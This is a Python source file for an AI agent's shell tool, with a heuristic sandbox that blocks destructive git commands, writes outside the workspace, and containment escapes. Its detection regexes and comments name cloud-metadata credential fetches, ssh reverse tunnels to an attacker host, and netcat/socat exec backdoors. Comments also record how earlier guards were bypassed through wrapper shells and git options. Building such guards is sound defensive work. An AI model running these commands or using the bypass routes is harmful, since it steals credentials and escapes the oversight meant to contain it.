"""Bash tool — execute shell commands and return stdout/stderr."""

from __future__ import annotations

import asyncio
import locale
import logging
import os
import re
import shlex
import signal
import tempfile

from emrg._win import win32_no_window_kwargs
from emrg.server.git_utils import no_prompt_env
from emrg.server.tool_types import ToolDefinition, ToolResult
from emrg.tools.base import ToolExecutor

logger = logging.getLogger(__name__)


MAX_OUTPUT_CHARS = 200_000  # Truncate large outputs (framing supports up to 16MB)

# Heredoc start: `cmd <<'EOF'` / `cmd <<EOF` / `cmd <<-EOF` (quote optional,
# matched symmetrically via backreference). MULTILINE so ^/$ bound the first
# command line, not the whole command string. cmd.exe cannot parse this.
_HEREDOC_START_RE = re.compile(
    r"^(?P<head>.*?)(?P<op><<-?)(?P<quote>['\"]?)(?P<name>[A-Za-z_][A-Za-z0-9_.-]*)(?P=quote)\s*$",
    re.MULTILINE,
)


def _translate_windows_heredocs(cmd: str) -> tuple[str, str | None]:
    """Translate the first bash heredoc into a stdin redirect for cmd.exe.

    The bash tool's subprocess shell on Windows is cmd.exe (via COMSPEC),
    which cannot parse ``cmd <<'EOF' ... EOF`` heredocs — commands documented
    with heredoc syntax (e.g. ``browser-harness <<'PY' ... PY``) fail with
    ``<< is not recognized`` / ``此时不应有 <<``, forcing agents into temp-file
    workarounds. Rewriting the heredoc to ``cmd < tempfile`` feeds the same
    bytes via stdin redirect, so Windows agents run the identical commands as
    POSIX (host sessions 2026-08-14T21:26/21:36 observed the failure twice).

    Only the FIRST heredoc is translated (multiple heredocs in one command are
    rare); an unterminated heredoc is left untouched so cmd.exe reports the
    original error. ``<<-`` (tab-stripping) strips leading tabs from the body,
    mirroring bash. Content is written literally (quoted ``<<'EOF'``
    semantics; unquoted heredocs containing ``$`` expansion keep literal
    content — a documented approximation). Everything before the opener line
    (e.g. ``cd /tmp\n`` in a multi-line command) is preserved verbatim in the
    rewritten command, so the heredoc feeds the same stdin into the same
    command line as POSIX (review #797 ❌).

    Returns ``(rewritten_cmd, temp_path)`` — the caller must unlink temp_path
    after the subprocess finishes (normal or timeout path).
    """
    m = _HEREDOC_START_RE.search(cmd)
    if not m:
        return cmd, None
    head, op, name = m.group("head"), m.group("op"), m.group("name")
    strip_tabs = op.endswith("-")
    # Terminator: a line containing exactly the delimiter (optionally indented
    # with tabs when the opener used `<<-`, mirroring bash tab-stripping).
    term = re.compile(rf"(?m)^[ \t]*{re.escape(name)}\s*$" if strip_tabs
                      else rf"(?m)^{re.escape(name)}\s*$")
    tm = term.search(cmd, m.end())
    if not tm:
        return cmd, None  # unterminated — let cmd.exe report it
    body = cmd[m.end():tm.start()]
    if body.startswith("\r\n"):
        body = body[2:]  # opener-line newline is not part of the body
    elif body.startswith("\n"):
        body = body[1:]
    if strip_tabs:
        body = "\n".join(line.lstrip("\t") for line in body.split("\n"))
    # bash keeps the newline that precedes the terminator line as part of the
    # body (a heredoc always ends with exactly one newline) — keep it verbatim.
    tail = cmd[tm.end():].strip()
    fd, path = tempfile.mkstemp(suffix=".heredoc", text=True)
    try:
        # newline="" keeps LF verbatim (no CRLF conversion of the body)
        with os.fdopen(fd, "w", encoding="utf-8", newline="") as f:
            f.write(body)
    except Exception:
        try:
            os.unlink(path)
        except OSError:
            pass
        raise
    # Keep everything before the opener line (multi-line commands such as
    # `cd /tmp\npython <<'PY'` must not lose their prefix — review #797 ❌).
    rewritten = f"{cmd[:m.start()]}{head}< \"{path}\""
    if tail:
        rewritten += f" {tail}"
    return rewritten.rstrip(), path


# ── Sandbox — file-level isolation for the bash tool (rant 2026-08-20T15:46:50) ──
#
# Three tiers (default danger-full-access = current, un-sandboxed behavior):
#   danger-full-access  — no checks at all (existing behavior)
#   read-only           — no writes allowed: destructive commands (rm -r /
#                         rmdir / mv / cp -r), git mutating commands (stash /
#                         checkout / restore / clean / reset / commit / push /
#                         pull / merge / rebase — community issue #979) and
#                         shell redirects (> / >>) to any non-/dev/null target
#                         are blocked
#   workspace-write     — writes inside the workspace root (and the OS temp
#                         area) are allowed; destructive writes to protected
#                         daemon state files and to absolute paths outside
#                         the workspace are blocked
#   both checked tiers  — destination-based containment-escape guard
#                         (issue #1102, borrowed from Claude Code v2.1.257):
#                         cloud metadata-credential fetches (IMDS/ECS/GCP)
#                         and egress-tunnel markers (ssh -R/-D, nc -e,
#                         socat EXEC:/SYSTEM:, IMDSv2 token) are blocked;
#                         the danger tier only warns (command still runs)
#
# Enforcement is deliberately heuristic (host design-finalized): a static
# command scan, NOT an OS-level sandbox (no bwrap/Seatbelt/ACL). The checked
# modes report enforcement="partial" — honest reporting, never pretending
# full OS-level isolation. The core value is blocking a hallucinated LLM's
# obviously destructive commands (rm -rf with a wrong path, writing the
# daemon's own state files).

SANDBOX_MODES = ("danger-full-access", "read-only", "workspace-write")

# Daemon state files — writing to these from a sandboxed task is always
# blocked (they are the daemon's own data, not agent scratch space).
_PROTECTED_FILES = (
    "~/.emrg/config.toml",
    "~/.emrg/emrgd.token",
    "~/.emrg/tasks.yml",
    "~/.emrg/projects.yml",
    "~/.emrg/rants.jsonl",
)

# Git mutating commands — blocked under read-only (community issue #979,
# heinrichneb dev.to comment on the 2026-08-20 data-loss postmortem): the
# incident's actual killers (`git stash`, `git checkout .`, `git reset --hard`,
# `git clean`) were NOT caught by the rm/rmdir/mv/cp checks. Under read-only
# these must be structurally impossible, not merely discouraged by a prompt
# rule — "rules can regress; topology can't". Read-only git reads (status /
# fetch / log / diff / remote) stay allowed.
#
# ⚠️ These are matched against the **parsed** command (the resolved verb), not
# against raw command text (issues #1156 + #1159). Both filed defects had the
# same root cause: a regex over the raw string is a statement about *spelling*,
# while the guard's purpose is a statement about *effect*.
#
#   - Under-block (#1156): a git global option sits exactly where the old
#     pattern expected the subcommand, so `git -C . checkout .`,
#     `git -c x=1 stash` and `git --work-tree=. reset --hard` were all allowed
#     (7/7 mutators × 4/4 spellings).
#   - Under-block (#1159): a verb never on the list — `git read-tree -u --reset
#     HEAD` destroys uncommitted work and was allowed. `--reset` is a substring
#     but not the verb, so it did not match.
#   - Over-block: the same raw-text scan refused commands that merely *mention*
#     a mutator (a string literal inside a heredoc), and `git merge-base` was
#     refused as though it were `git merge`.
#
# Parsing fixes all three at once and is the reason this is a verb set rather
# than more regex: the unit of protection becomes the resolved verb.
_GIT_MUTATOR_VERBS = frozenset({
    # working-tree / index / history writers (issue #979's data-loss set)
    "stash", "checkout", "restore", "clean", "reset", "commit", "push", "pull",
    "merge", "rebase", "cherry-pick", "cherry_pick", "revert", "rm", "mv",
    "switch", "apply", "am", "archive", "submodule", "worktree", "add",
    # plumbing writers that were never enumerated (issue #1159): `read-tree -u
    # --reset` overwrites the working tree; the rest rewrite refs / objects /
    # history, which is the same class of damage. Listed because they are
    # *mutating*, not because someone remembered them.
    "read-tree", "update-ref", "update-index", "symbolic-ref", "reflog",
    "gc", "repack", "prune", "sparse-checkout", "filter-branch", "replace",
    "pack-refs", "write-tree", "commit-tree", "mktag", "notes",
    # flag-decided verbs: only a delete/force flag makes them destructive
    "branch", "tag",
    # subcommand-decided verbs: reads like `git remote -v` / `git config -l`
    # stay allowed, writers (`set-url`, `core.hooksPath=…`) block
    "remote", "config",
})
# `git branch -a` / `git tag -l` / `git tag` are reads; a delete or force flag
# makes them destructive (`git branch -D old`, `git tag -d v1`).
_GIT_WRITE_FLAGS = frozenset({"-d", "-D", "--delete", "-f", "--force", "-m",
                              "-M", "--move", "--set-upstream-to", "-u"})
# Verbs whose *subcommand* decides: `git stash list` reads, `git stash drop`
# writes. The subcommand is the resolved word after the verb.
_GIT_SUBCOMMAND_READERS = {
    "stash": frozenset({"list", "show"}),
    "worktree": frozenset({"list"}),
    "submodule": frozenset({"status", "summary"}),
    "remote": frozenset({"show", "get-url", "v"}),
}
# Verbs where *no* subcommand is a read (they print help / list). `git stash`
# alone is NOT here: a bare `git stash` saves and cleans the tree — a mutator.
_GIT_NO_SUBCOMMAND_READS = frozenset({"remote", "worktree", "submodule"})
# `git config` reads unless it writes: read flags, or no positional key.
_GIT_CONFIG_READ_FLAGS = frozenset({"--get", "--get-all", "--get-regexp",
                                    "-l", "--list", "--get-urlmatch"})
# git global options that take a SEPARATE argument — the parser must skip both
# the option and its value to find the verb (`git -C . checkout .`).
_GIT_GLOBAL_WITH_VALUE = frozenset({"-C", "-c", "--exec-path", "--git-dir",
                                    "--work-tree", "--namespace", "--super-prefix"})
# Shell operators that separate one command from the next in a chain.
_SHELL_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})
# Shells whose `-c <string>` argument is itself a command the shell will run.
# The guard must read *that* text, not stop at the outer token stream: before
# this, `sh -c 'git checkout .'` reached the mutator only because a raw-text
# regex happened to scan the whole line. Parsing the outer tokens alone sees
# `sh`, `-c`, and one opaque string — so a wrapper no longer blocks unless the
# nested text is parsed too. This is a return to the old behaviour by a
# different route: the old scan was right about these 5 shapes and wrong about
# the 7 it missed; parsing must not trade one half for the other.
_SHELL_WRAPPERS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "ash"})
# Commands whose entire argument list is a command the shell will re-parse and
# run (`eval 'git checkout .'`). `xargs`/`env`/`nohup`/`time`/`command` prefix
# a real invocation and are already handled, because the invocation is still in
# the token stream.
_SHELL_EVALUATORS = frozenset({"eval"})

# ── Containment-escape guard (issue #1102) ─────────────────────────────────
# Borrowed from Claude Code v2.1.257 ("Containment Escape"): block cloud
# metadata-credential fetches and egress-tunnel markers. The write-target
# scan cannot catch these — a metadata fetch is a READ and touches no
# protected file path, so the destination-based scan below is required.

# Cloud metadata endpoints — never legitimate in development commands.
# IMDSv1/v2 (AWS), ECS container creds (AWS), GCP metadata (IP + DNS),
# IMDSv2 IPv6 (AWS).
_METADATA_ENDPOINT_RE = re.compile(
    r"169\.254\.169\.254|169\.254\.170\.2|169\.254\.169\.123|"
    r"metadata\.google\.internal|fd00:ec2::254"
)
# ssh remote/dynamic forward (-R / -D) — the classic egress tunnels
# (`ssh -R 1080:169.254.169.254:80 user@attacker`). Requires a standalone
# `ssh` token (never ssh-add/ssh-agent/ssh-keygen/...), stops at quotes so
# `ssh host 'grep -R x'` (a remote command, not a tunnel) is not flagged, and
# does NOT block `-L` (the common dev port-forward; a `-L` whose destination
# is a metadata endpoint is already caught by the endpoint rule above).
_SSH_TUNNEL_RE = re.compile(
    r"(?<!\S)ssh(?:\.exe)?\s+(?:[^|;&\n'\"]*?\s)?-[a-zA-Z]*[RD][a-zA-Z]*"
)
# ssh long-form forwards (`-o RemoteForward=...` / `-o DynamicForward=...`).
# These are often quoted (`-o 'RemoteForward=1080:localhost:80'`), so this
# rule deliberately does NOT stop at quotes — the RemoteForward=/DynamicForward=
# string has no legitimate non-tunnel use (unlike `-R`, which collides with
# `grep -R` inside remote commands).
_SSH_FORWARD_LONG_RE = re.compile(
    r"(?<!\S)ssh(?![\w-])[^|;&\n]*?\b(?:Remote|Dynamic)Forward\s*="
)
# netcat / ncat with -e/--exec — a reverse/backdoor shell, never legitimate.
_NC_EXEC_RE = re.compile(
    r"\bnc(?:at)?\b[^|;&\n'\"]*?(?:-[a-zA-Z]*e[a-zA-Z]*\b|--exec\b)"
)
# socat with EXEC:/SYSTEM: — a backdoor address, never legitimate.
_SOCAT_EXEC_RE = re.compile(r"\bsocat\b[^|;&\n'\"]*\b(?:EXEC|SYSTEM):")
# IMDSv2 token request header — belt-and-suspenders for URL-obfuscated fetches.
_IMDSV2_TOKEN_RE = re.compile(r"X-aws-ec2-metadata-token")


def _check_containment_escape(cmd: str) -> str | None:
    """Destination-based containment-escape scan (issue #1102, borrowed from
    Claude Code v2.1.257 "Containment Escape").

    Returns a block reason naming the exact escape vector when the command
    fetches cloud metadata credentials or opens an egress tunnel; returns
    None when the command looks clean.

    Complements the write-target scan: ``curl http://169.254.169.254/...``
    touches no protected file path, so ``workspace-write`` target checks pass
    it — the credential exfiltration happens over the network. Runs on both
    checked tiers (read-only blocks writes, but a metadata fetch is a read,
    so the destination check is required there too).
    """
    for label, pattern in (
        ("cloud-metadata endpoint", _METADATA_ENDPOINT_RE),
        ("ssh egress tunnel (-R/-D)", _SSH_TUNNEL_RE),
        ("ssh egress tunnel (Remote/DynamicForward)", _SSH_FORWARD_LONG_RE),
        ("netcat exec backdoor", _NC_EXEC_RE),
        ("socat EXEC/SYSTEM backdoor", _SOCAT_EXEC_RE),
        ("IMDSv2 token request", _IMDSV2_TOKEN_RE),
    ):
        m = pattern.search(cmd)
        if m:
            return (
                f"containment-escape: blocked {label} {m.group(0)!r} "
                "(cloud credential exfiltration guard, issue #1102)"
            )
    return None


def _extract_write_targets(cmd: str) -> list[str]:
    """Heuristic extraction of write targets from a command line.

    Returns path tokens the command appears to write to:
      - ``rm -r/-rf/-R <path>`` and ``rmdir <path>`` → the removed path
      - ``mv <src> <dst>`` / ``cp -r <src> <dst>`` → the destination
      - ``> / >> / 2> / &>`` redirects → the redirect target

    Deliberately non-exhaustive (the sandbox only catches obvious
    destructive writes — the boundary is honest: enforcement=partial).
    """
    targets: list[str] = []
    # rm -r / rm -rf / rm -R ... <path>  (recursive delete)
    for m in re.finditer(r"\brm\s+(?:-[a-zA-Z]*[rR][a-zA-Z]*\s+)+([^\s|;&]+)", cmd):
        targets.append(m.group(1))
    # rmdir <path>
    for m in re.finditer(r"\brmdir\s+([^\s|;&]+)", cmd):
        targets.append(m.group(1))
    # mv <src> <dst> — the destination is the last bare token
    for m in re.finditer(r"\bmv\s+((?:-[a-zA-Z]*\s+)*[^\s|;&]+\s+[^\s|;&]+)", cmd):
        toks = m.group(1).split()
        if len(toks) >= 2:
            targets.append(toks[-1])
    # cp -r <src> <dst> — the destination is the last bare token
    for m in re.finditer(r"\bcp\s+(?:-[a-zA-Z]*[rR][a-zA-Z]*\s+)+([^\s|;&]+\s+[^\s|;&]+)", cmd):
        toks = m.group(1).split()
        if len(toks) >= 2:
            targets.append(toks[-1])
    # shell redirects: > file / >> file / 2> file / &> file
    for m in re.finditer(r"(?:\d*>>?|&>>?)\s*([^\s|;&]+)", cmd):
        targets.append(m.group(1))
    return targets


def _protected_paths() -> list[str]:
    """Canonicalized (realpath) protected daemon state files."""
    out: list[str] = []
    for p in _PROTECTED_FILES:
        try:
            out.append(os.path.realpath(os.path.expanduser(p)))
        except OSError:
            pass
    return out


def _trusted_write_zones() -> list[str]:
    """Canonicalized write roots that a ``workspace-write`` session may target.

    These are trusted alongside the injected workspace root and the OS temp
    area — targets inside them are never blocked by the ``workspace-write``
    boundary:

    - ``~/.emrg/evolution/.emrg/`` — the evolution module's own data root
      (cycle records under ``memory/``, ``sessions/`` scratch). The evolution
      task runs at ``workspace-write`` with ``workspace`` = the repo checkout
      (``~/.emrg/evolution/emrg``), so its own record writes to
      ``~/.emrg/evolution/.emrg/memory/*.md`` fall OUTSIDE ``workspace`` and
      would be blocked — a self-regression from PR #1092 (issue #1093). Trust
      this root like the daemon's own ``~/.emrg`` state, so the evolution
      module can still record its history.
    """
    out: list[str] = []
    evo_data = os.path.expanduser("~/.emrg/evolution/.emrg")
    try:
        out.append(os.path.realpath(evo_data))
    except OSError:
        pass
    return out


def _temp_write_roots() -> set[str]:
    r"""Canonicalized OS-temp write roots, normalized for the ``Temp\<suffix>``
    discrepancy (issue #1093 proposal #3).

    ``tempfile.gettempdir()`` may return ``C:\\...\\AppData\\Local\\Temp\\2``
    (8.3 short name + ``\\2`` suffix) on Windows, while helpers/scripts are
    written to the plain ``...\\Temp\\`` root. When ``gettempdir()`` points at
    a ``Temp``-named parent with a suffix child, also trust the parent ``Temp``
    root so both spellings are allowed.
    """
    roots: set[str] = set()
    t = tempfile.gettempdir()
    try:
        roots.add(os.path.realpath(t))
    except OSError:
        pass
    parent = os.path.dirname(t)
    if os.path.basename(parent).lower() == "temp":
        try:
            roots.add(os.path.realpath(parent))
        except OSError:
            pass
    return roots


def _is_absolute_path(p: str) -> bool:
    """True when ``p`` is absolute (or drive-less rooted, e.g. ``/etc/hosts``
    on Windows — ntpath.isabs returns False for those, but they still do not
    resolve under the cwd, so the sandbox must treat them as absolute)."""
    return os.path.isabs(p) or p.startswith("/") or p.startswith("\\")


def _is_within(path: str, root: str) -> bool:
    """True when ``path`` (absolute) is inside ``root`` (absolute) or equals it."""
    try:
        rp = os.path.realpath(path)
        rr = os.path.realpath(root)
        return rp == rr or rp.startswith(rr + os.sep)
    except OSError:
        return False


def check_read_only_file_write(file_path: str, workspace: str | None = None) -> str | None:
    """Read-only sandbox check for the write/edit tools (community issue #979).

    Returns a block reason when the target file is inside the task's workspace
    (the host's working tree — protected by the structural dirty-tree guard) or
    is a protected daemon state file; returns None when allowed.

    Writes OUTSIDE the workspace (memory dir, logs, OS temp) stay allowed so a
    read-only cycle can still record state and write its own artifacts — the
    guard protects the host's uncommitted work, not the agent's own scratch
    space. Mirrors the bash tool's read-only semantics for file tools.
    """
    path = os.path.realpath(os.path.expanduser(file_path))
    if workspace:
        ws = os.path.realpath(os.path.expanduser(workspace))
        if _is_within(path, ws):
            return (
                f"read-only sandbox: blocked file write inside workspace {path!r} "
                "(dirty-tree guard, community issue #979)"
            )
    if path in _protected_paths():
        return (
            f"read-only sandbox: blocked write to protected daemon file {path!r}"
        )
    return None


def check_workspace_write(file_path: str, workspace: str | None = None) -> str | None:
    """workspace-write sandbox check for the write/edit tools (rant 2026-09-01T15:10:23).

    Returns a block reason when the target file is a protected daemon state file,
    is ``~/.emrg`` itself, or is an absolute path outside the workspace root
    (OS temp allowed — mirrors dsh's workspace + backend-promised temp area);
    returns None when allowed.

    Relative paths are assumed in-workspace (cwd = the workspace root), matching
    the bash tool's workspace-write semantics (2026-08-20T15:46:50) and dsh's
    writableRoots single-source + tool-symmetry design. Without this check the
    write/edit tools let ``workspace-write`` sessions write anywhere outside the
    session cwd, while the bash tool is correctly blocked — the asymmetric hole
    this function closes.
    """
    if not file_path:
        return None
    expanded = os.path.expanduser(file_path)
    if not _is_absolute_path(expanded):
        # Relative target: assumed in-workspace (cwd = the workspace root).
        return None
    real = os.path.realpath(expanded)
    if real in _protected_paths():
        return (
            f"workspace-write sandbox: blocked write to protected daemon file {file_path!r}"
        )
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    if real == emrg_home:
        return (
            f"workspace-write sandbox: blocked destructive write to {file_path!r} "
            "(would erase the daemon's data directory)"
        )
    workspace_real = (
        os.path.realpath(os.path.expanduser(workspace)) if workspace else None
    )
    # Allow: inside workspace, inside the OS-temp roots (normalized), or inside
    # a trusted zone (~/.emrg/evolution/.emrg — the evolution module's own data
    # root, issue #1093 self-regression). Everything else is blocked.
    allowed_srcs = [workspace_real] if workspace_real else []
    allowed_srcs += list(_trusted_write_zones())
    allowed_srcs += list(_temp_write_roots())
    if not any(
        src and (_is_within(real, src) or real == src) for src in allowed_srcs
    ):
        return (
            f"workspace-write sandbox: blocked write outside workspace {file_path!r}"
        )
    return None


def _tokenize_command(cmd: str) -> list[str]:
    """Split a shell command into tokens, preserving operators like ``&&``.

    Uses ``shlex`` so quoting is respected: a mutator mentioned inside a string
    literal is one token, not a command word — which is what stops the guard
    from refusing a command that merely *talks about* `git merge` (issue #1156
    facet D). Falls back to a whitespace split when the input is unparseable
    (an unterminated quote), because a guard that crashes on odd input is worse
    than one that over-blocks it.
    """
    try:
        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        return list(lex)
    except ValueError:
        return cmd.split()


def _git_verbs(tokens: list[str]) -> list[tuple[str, list[str]]]:
    """Resolve every ``git`` invocation in a token stream to ``(verb, rest)``.

    Walks the token stream, and at each ``git`` token skips git's *global*
    options to find the resolved verb (issue #1156: a global option sits
    exactly where a raw-text regex expects the subcommand). Returns one entry
    per invocation, so a chained command is judged by all of its invocations.

    ``rest`` is the tokens after the verb, needed to decide flag/subcommand-
    dependent verbs (`git branch -D` writes, `git branch -a` reads).
    """
    out: list[tuple[str, list[str]]] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if _basename(tok) != "git":
            i += 1
            continue
        j = i + 1
        # Skip global options (and the separate value of options that take one).
        while j < len(tokens):
            nxt = tokens[j]
            if nxt in _GIT_GLOBAL_WITH_VALUE:
                j += 2
                continue
            if nxt.startswith("-"):
                j += 1
                continue
            break
        if j < len(tokens):
            out.append((tokens[j], tokens[j + 1:]))
        i = j + 1
    return out


def _git_invocation_is_mutator(verb: str, rest: list[str]) -> str | None:
    """Classify one resolved git invocation. Returns the offending verb, or None.

    The decision is on the *effect*, not the spelling: read-only inspections
    that the raw-text scan had to special-case by regex (`git stash list`,
    `git worktree list`, `git submodule status`, `git branch -a`,
    `git remote -v`, `git config -l`) are read here from the resolved verb +
    flags, so they stay allowed without an exemption pattern to keep in sync.
    """
    if verb not in _GIT_MUTATOR_VERBS:
        return None
    readers = _GIT_SUBCOMMAND_READERS.get(verb)
    if readers is not None:
        # Subcommand-decided: `stash list` reads, `stash drop` writes. A
        # missing subcommand is a write for `stash` (bare `git stash` saves and
        # cleans the tree) but a read for the listing verbs (`git remote -v`).
        sub = next((t for t in rest if not t.startswith("-")), None)
        if sub in readers:
            return None
        if sub is None and verb in _GIT_NO_SUBCOMMAND_READS:
            return None
        return verb
    if verb in ("branch", "tag"):
        # Only a delete/force/move flag makes these destructive; a bare
        # `git branch` / `git tag` / `-a` / `-l` is a read.
        if any(t in _GIT_WRITE_FLAGS or t.startswith("--delete") for t in rest):
            return verb
        return None
    if verb == "config":
        if any(t in _GIT_CONFIG_READ_FLAGS for t in rest):
            return None
        # `git config <key>` with no value is a read; `key=value` or `--set`
        # writes. A lone positional key is ambiguous, so treat a single
        # positional as a read and anything that looks like an assignment as
        # a write.
        positional = [t for t in rest if not t.startswith("-")]
        if len(positional) >= 2 and "=" not in positional[0]:
            return verb
        if any("=" in t and not t.startswith("-") for t in positional):
            return verb
        return None
    if verb == "remote":
        # `git remote -v` / `show` / `get-url` read; `set-url`/`add`/`remove` write.
        sub = next((t for t in rest if not t.startswith("-")), None)
        if sub is None or sub in _GIT_SUBCOMMAND_READERS["remote"]:
            return None
        return verb
    return verb


def _basename(tok: str) -> str:
    """The command word without its directory prefix or Windows extension.

    `/usr/bin/git` and `git.exe` name the same program as `git`; a guard that
    only recognises the bare spelling is a guard against the polite form of
    the command. (On Windows the shell resolves `git` to `git.exe`, so the
    extension form is the one that actually runs there.)
    """
    base = tok.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    return base


def _nested_command_texts(tokens: list[str]) -> list[str]:
    """The command strings a shell will itself re-parse out of ``tokens``.

    Returns the argument of every `sh -c <text>` (and the other wrapper
    shells) and every `eval <text>`, so the caller can recurse into them.

    Why this is needed rather than optional: tokenising splits a command into
    an outer invocation plus an opaque string literal, and a string literal is
    data. `sh -c 'git checkout .'` therefore parses as the command `sh` with a
    quoted payload — no git invocation at all. The pre-parsing guard blocked
    it, because a raw-text regex over the whole line did not care where the
    word sat. Dropping that scan silently made 5 wrapper shapes writable under
    read-only (measured 2026-09-12 against master: `sh -c` / `bash -c` /
    `zsh -c` / `dash -c` / `eval` all went from blocked to allowed), which is
    the one direction this guard must never move in. So the parsed design has
    to model the nesting explicitly.

    The wrapper is recognised only when the shell binary and its `-c` flag are
    *separate tokens* — that is what `sh -c ...` is. A shell keyword command
    such as `-c` inside a single token (`set -c`) is not treated as one.
    """
    out: list[str] = []
    for i, tok in enumerate(tokens):
        if _basename(tok) in _SHELL_WRAPPERS:
            # `sh -c <text>`: find the `-c` flag, then take what follows.
            for j in range(i + 1, len(tokens)):
                arg = tokens[j]
                if arg.startswith("-") and not arg.startswith("--"):
                    if "c" in arg[1:]:
                        if j + 1 < len(tokens):
                            out.append(tokens[j + 1])
                        break
                    continue
                break
        elif _basename(tok) in _SHELL_EVALUATORS:
            # `eval <text...>`: every remaining token is re-parsed as a command.
            out.extend(tokens[i + 1:])
    return out


def _find_git_mutator(cmd: str, _depth: int = 0) -> str | None:
    """The first mutating git verb in ``cmd``, or None when there is none.

    Parses rather than scans (issues #1156 + #1159): every `git` invocation in
    a chained command is resolved to its verb and classified by effect. Returns
    a human-readable phrase for the block reason.

    Recurses into shell execution contexts (`sh -c <text>`, `eval <text>`), so
    a mutator that the shell will run is judged wherever it is written. Depth
    is capped rather than trusted: nesting is bounded by the shell itself, and
    a guard must terminate on adversarial input.
    """
    tokens = _tokenize_command(cmd)
    for verb, rest in _git_verbs(tokens):
        hit = _git_invocation_is_mutator(verb, rest)
        if hit:
            return f"git {hit}"
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            hit = _find_git_mutator(nested, _depth + 1)
            if hit:
                return hit
    return None


def _check_sandbox(cmd: str, mode: str, workdir: str | None = None) -> tuple[bool, str | None, str]:
    """Static sandbox check for a bash command (rant 2026-08-20T15:46:50).

    Returns ``(allowed, blocked_reason, enforcement)``:
      - danger-full-access → (True, None, "full") — no checks, current behavior.
      - read-only → blocks every destructive write (rm -r / rmdir / mv /
        cp -r and shell redirects to any non-/dev/null target).
      - workspace-write → blocks destructive writes to protected daemon
        files, to ``~/.emrg`` itself, and to absolute paths outside the
        workspace root (the OS temp dir is allowed — mirrors dsh's
        workspace + backend-promised temp area).

    Heuristic by design: static scan only, no OS-level boundary — checked
    modes honestly report enforcement="partial".
    """
    if mode not in SANDBOX_MODES:
        return False, f"invalid sandbox mode {mode!r}", "partial"
    if mode == "danger-full-access":
        return True, None, "full"

    # Containment-escape guard (issue #1102): destination-based, applies to
    # both checked tiers. A metadata-credential fetch is a READ and escapes
    # the write-target scan below — it must run before the early returns.
    escape = _check_containment_escape(cmd)
    if escape:
        return False, escape, "partial"

    targets = _extract_write_targets(cmd)
    if mode == "read-only":
        for t in targets:
            if t != "/dev/null":
                return False, (
                    f"read-only sandbox: blocked destructive write targeting {t!r}"
                ), "partial"
        # Git mutators are blocked too — the 2026-08-20 data-loss commands
        # (stash / checkout . / reset --hard / clean) write no file targets
        # and escaped the target scan (community issue #979). Also blocks
        # working-tree writers: apply / am / archive / submodule / worktree.
        #
        # Decided by **parsed verb**, not raw text (issues #1156 + #1159): a
        # global option between `git` and the subcommand used to defeat the
        # alternation, `git read-tree -u --reset` was never on the list, and
        # a command merely *mentioning* a mutator was refused. Chained commands
        # are judged per invocation, so `git stash list && git stash drop` still
        # blocks while a bare `git stash list` reads.
        hit = _find_git_mutator(cmd)
        if hit:
            return False, (
                f"read-only sandbox: blocked git mutating command {hit!r} "
                "(dirty-tree guard, community issue #979)"
            ), "partial"
        return True, None, "partial"

    # workspace-write
    if not targets:
        return True, None, "partial"
    protected = _protected_paths()
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    workdir_real = os.path.realpath(workdir) if workdir else None
    for t in targets:
        if t == "/dev/null":
            continue
        expanded = os.path.expanduser(t)
        if not _is_absolute_path(expanded):
            # Relative target: assumed in-workspace (cwd = the workspace root).
            continue
        real = os.path.realpath(expanded)
        if real in protected:
            return False, (
                f"workspace-write sandbox: blocked write to protected daemon file {t!r}"
            ), "partial"
        if real == emrg_home:
            return False, (
                f"workspace-write sandbox: blocked destructive write to {t!r} "
                "(would erase the daemon's data directory)"
            ), "partial"
        allowed_srcs = [workdir_real] if workdir_real else []
        allowed_srcs += list(_trusted_write_zones())
        allowed_srcs += list(_temp_write_roots())
        if not any(
            src and (_is_within(real, src) or real == src) for src in allowed_srcs
        ):
            return False, (
                f"workspace-write sandbox: blocked write outside workspace {t!r}"
            ), "partial"
    return True, None, "partial"


def _decode_output(data: bytes, os_name: str | None = None) -> str:
    """Decode subprocess output bytes without corrupting non-UTF-8 text.

    POSIX: subprocess output is UTF-8 — unchanged behavior.

    Windows: cmd.exe/dir/echo output uses the console locale code page
    (GBK/cp936 on zh-CN), while git/gh emit UTF-8. Both must decode
    correctly, so we try the locale encoding **strictly** first and fall
    back to UTF-8 (also strict), then to UTF-8 with replacement as a last
    resort. A non-strict first attempt would silently mojibake UTF-8
    output and never reach the fallback (rant 2026-08-08T09:35:30 —
    U+FFFD garbage from decoding GBK bytes as UTF-8).

    ``os_name`` is injectable for tests (defaults to ``os.name``).
    """
    if not data:
        return ""
    name = os_name or os.name
    if name == "nt":
        enc = locale.getpreferredencoding(False) or "utf-8"
        for candidate in (enc, "utf-8"):
            try:
                return data.decode(candidate)  # strict
            except (LookupError, UnicodeDecodeError):
                continue
    return data.decode("utf-8", errors="replace")


class BashTool(ToolExecutor):
    """Execute shell commands via asyncio subprocess."""

    def definition(self) -> ToolDefinition:
        return ToolDefinition(
            name="bash",
            description=(
                "Execute a shell command and return stdout and stderr. "
                "Use for running tests, git commands, listing files, "
                "installing packages, and other shell operations. "
                "Commands run in the working directory by default; "
                "use the `workdir` parameter to override."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The shell command to execute. Bash heredocs "
                        "(cmd <<'EOF' ... EOF) are supported on all platforms "
                        "— on Windows they are auto-translated to stdin redirects.",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Timeout in seconds (default: 30).",
                    },
                    "workdir": {
                        "type": "string",
                        "description": "Working directory for the command (default: project root).",
                    },
                    "intent": {
                        "type": "string",
                        "description": "The purpose of this call: why you are invoking it and what you want to achieve. "
                        "One human-readable sentence, e.g. 'check how billing is implemented in billing.rs'.",
                    },
                },
                "required": ["command", "intent"],
            },
        )

    async def execute(self, arguments: dict) -> ToolResult:
        cmd = arguments.get("command", "")
        timeout = arguments.get("timeout", 30)
        workdir = arguments.get("workdir", None)
        # Sandbox tier — daemon-injected per task config (the agent cannot
        # choose its own sandbox; rant 2026-08-20T15:46:50).
        sandbox = arguments.get("sandbox")

        if not cmd:
            return ToolResult(name="bash", content="Error: no command provided", error=True)

